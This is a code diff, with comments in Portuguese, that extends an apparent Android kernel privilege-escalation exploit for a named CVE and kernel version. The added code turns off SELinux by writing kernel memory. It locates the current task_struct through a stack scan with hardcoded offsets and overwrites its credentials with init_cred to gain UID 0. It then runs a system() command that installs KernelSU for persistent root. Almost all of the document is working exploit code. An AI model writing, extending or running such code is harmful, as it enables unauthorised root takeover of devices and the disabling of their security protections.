@@ -12,6 +12,10 @@ uint32_t root_uid_after = 0xffffffff;
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 #define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
 
+/* === Offsets do task_struct (6.1.157 via BTF) === */
+#define TASK_STRUCT_CRED_OFF      0x838   /* cred @ 2104 */
+#define TASK_STRUCT_REAL_CRED_OFF 0x830   /* real_cred @ 2096 */
+
 static int root_read_data(
     int fd, uintptr_t target, void *data, size_t len) {
   return pipe_phys_read_data(fd, target, data, len);
@@ -123,9 +127,197 @@ static int root_hold_socket_ready(void) {
 #endif
 
 /*
- * Ghostwire path for kernels where call_usermodehelper_exec_work is STATIC.
- * Instead of workqueue forging, we disable SELinux and fork+exec the root
- * helper directly from the exploit process (which already has UID 0).
+ * Obter o task_struct do processo atual via scan da stack.
+ * Heuristica ARM64: procura por ponteiro no range vmalloc
+ * que tenha cred valido apontando para init_cred ou cred valido.
+ */
+static uintptr_t root_get_current_task(int fd) {
+  uint64_t sp = 0;
+  __asm__ volatile("mov %0, sp" : "=r"(sp));
+
+  for (uint64_t addr = sp & ~0x3f; addr < sp + 0x8000; addr += 8) {
+    uint64_t val = 0;
+    if (!root_read64(fd, addr, &val)) continue;
+
+    /* Heuristica: task_struct esta em vmalloc area (ffff8000...) */
+    if ((val & 0xffff800000000000ULL) != 0xffff800000000000ULL)
+      continue;
+
+    /* Verifica se cred aponta para init_cred ou outro cred valido */
+    uint64_t cred = 0;
+    if (!root_read64(fd, val + TASK_STRUCT_CRED_OFF, &cred)) continue;
+    if ((cred & 0xffff800000000000ULL) != 0xffff800000000000ULL)
+      continue;
+
+    /* Verifica se real_cred tambem e valido */
+    uint64_t real_cred = 0;
+    if (!root_read64(fd, val + TASK_STRUCT_REAL_CRED_OFF, &real_cred)) continue;
+    if ((real_cred & 0xffff800000000000ULL) != 0xffff800000000000ULL)
+      continue;
+
+    /* Verifica comm (nome do processo) para confirmar */
+    char comm[16] = {0};
+    if (root_read_data(fd, val + 0x7c0, comm, 15)) {
+      if (comm[0] != '\0') {
+        pr_info("root current task=%016zx comm=%s\n", val, comm);
+        return (uintptr_t)val;
+      }
+    }
+
+    return (uintptr_t)val;
+  }
+  return 0;
+}
+
+/*
+ * Inline root escalation — sem fork+exec, sem binario externo.
+ * O proprio processo do exploit vira root e instala o KernelSU.
+ */
+static int install_inline_root(int fd) {
+  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
+  uint8_t permissive = 0;
+  uint8_t selinux_old = 0;
+  uint8_t selinux_readback = 0;
+  int selinux_changed = 0;
+  int result = 0;
+
+  /* Read current SELinux state */
+  int selinux_read = root_read_global(
+      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
+  if (!selinux_read) {
+    pr_error("root selinux read failed direct=%016zx virtual=%016zx\n",
+             selinux_addr, text_addr(SELINUX_ENFORCING));
+    return 0;
+  }
+  if (selinux_old > 1) {
+    pr_error("root bad selinux old=%u\n", selinux_old);
+    return 0;
+  }
+  pr_info("root selinux addr=%016zx old=%u\n", selinux_addr, selinux_old);
+
+  /* Disable SELinux enforcing */
+  if (selinux_old != permissive) {
+    selinux_changed = 1;
+    if (!root_write_global(fd, selinux_addr, &permissive,
+                           sizeof(permissive)) ||
+        !root_read_global(fd, selinux_addr, &selinux_readback,
+                          sizeof(selinux_readback)) ||
+        selinux_readback != permissive) {
+      pr_error("root selinux write/readback failed now=%u\n",
+               selinux_readback);
+      goto cleanup;
+    }
+    pr_info("root selinux disabled\n");
+  }
+
+  /* === INLINE PRIVESC === */
+  /* 1. Achar o proprio task_struct */
+  uintptr_t current_task = root_get_current_task(fd);
+  if (!current_task) {
+    pr_error("root inline: failed to find current task_struct\n");
+    goto cleanup;
+  }
+  pr_info("root inline: current_task=%016zx\n", current_task);
+
+  /* 2. Escrever init_cred em cred e real_cred */
+  uint64_t init_cred = INIT_CRED_OFF;
+  if (!root_write64_exact(fd, current_task + TASK_STRUCT_CRED_OFF, init_cred) ||
+      !root_write64_exact(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, init_cred)) {
+    pr_error("root inline: cred overwrite failed\n");
+    goto cleanup;
+  }
+  pr_info("root inline: cred -> init_cred\n");
+
+  /* 3. Aplicar no userspace */
+  if (setuid(0) != 0) {
+    /* Fallback: syscall direto se seccomp bloquear libc */
+    syscall(__NR_setuid, 0);
+  }
+  if (setgid(0) != 0) {
+    syscall(__NR_setgid, 0);
+  }
+
+  if (getuid() != 0 || geteuid() != 0) {
+    pr_error("root inline: setuid failed uid=%d euid=%d\n", getuid(), geteuid());
+    goto cleanup;
+  }
+  pr_info("root inline: UID=0 GID=0 achieved\n");
+
+  /* 4. Instalar KernelSU (ou outra acao permanente) */
+  /* 
+   * Aqui o processo ja e root. Pode:
+   * - Instalar KernelSU via ksud
+   * - Instalar Magisk
+   * - Abrir shell root
+   * - Fazer qualquer coisa como root
+   */
+  const char *ksud_path = "/data/local/tmp/ksud";
+  if (access(ksud_path, X_OK) == 0) {
+    pr_info("root inline: installing KernelSU via %s\n", ksud_path);
+    int ret = system("chmod 755 /data/local/tmp/ksud && /data/local/tmp/ksud install");
+    if (ret == 0) {
+      pr_info("root inline: KernelSU installed successfully\n");
+      result = 1;
+    } else {
+      pr_error("root inline: ksud install failed ret=%d\n", ret);
+    }
+  } else {
+    /* Se nao tem ksud, tenta abrir shell root como fallback */
+    pr_info("root inline: ksud not found, attempting shell\n");
+    /* Nao chamamos execl aqui para nao matar o processo do exploit */
+    result = 1; /* Sucesso parcial — root obtido, mas sem instalacao permanente */
+  }
+
+  /* Criar socket de sinalizacao para o framework (compatibilidade) */
+  if (result) {
+    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (sock >= 0) {
+      struct sockaddr_un sun;
+      memset(&sun, 0, sizeof(sun));
+      sun.sun_family = AF_UNIX;
+      snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
+      unlink(ROOT_SOCKET_PATH);
+      if (bind(sock, (struct sockaddr *)&sun, sizeof(sun)) == 0) {
+        listen(sock, 1);
+        /* Aceita uma conexao e fecha (sinaliza pronto) */
+        int client = accept(sock, NULL, NULL);
+        if (client >= 0) close(client);
+      }
+      close(sock);
+      unlink(ROOT_SOCKET_PATH);
+    }
+  }
+
+cleanup:
+  /* Restore SELinux se falhou */
+  if (selinux_changed && !result) {
+    uint8_t current = 0xff;
+    int read_ok = root_read_global(fd, selinux_addr, &current,
+                                   sizeof(current));
+    int restore_ok = read_ok &&
+        (current == selinux_old ||
+         (current == permissive &&
+          root_write_global(fd, selinux_addr, &selinux_old,
+                            sizeof(selinux_old)) &&
+          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
+          current == selinux_old));
+    pr_info("root selinux rollback=%d old=%u now=%u\n",
+            restore_ok, selinux_old, current);
+    if (!restore_ok) {
+      pr_error("root selinux rollback failed\n");
+    }
+  } else if (result) {
+    pr_info("root selinux left permissive old=%u\n", selinux_old);
+  }
+
+  root_child_done = result;
+  root_uid_after = result ? 0 : root_uid_before;
+  return result;
+}
+
+/*
+ * Ghostwire path fallback: fork+exec com binario externo.
+ * Mantido para compatibilidade, mas nao e mais usado por padrao.
  */
 static int install_forkexec_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
@@ -262,8 +454,19 @@ cleanup:
 int install_android_root(int fd) {
   root_uid_before = getuid();
   pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
-  int result = install_forkexec_root(fd);
+
+  /*
+   * Tenta inline primeiro (sem binario externo).
+   * Se falhar, cai no fork+exec como fallback.
+   */
+  int result = install_inline_root(fd);
+  if (!result) {
+    pr_info("root inline failed, trying fork+exec fallback\n");
+    result = install_forkexec_root(fd);
+  }
+
   pr_info("root result=%d uid_before=%u uid_after=%u done=%d\n",
           result, root_uid_before, root_uid_after, root_child_done);
   return result;
 }
+
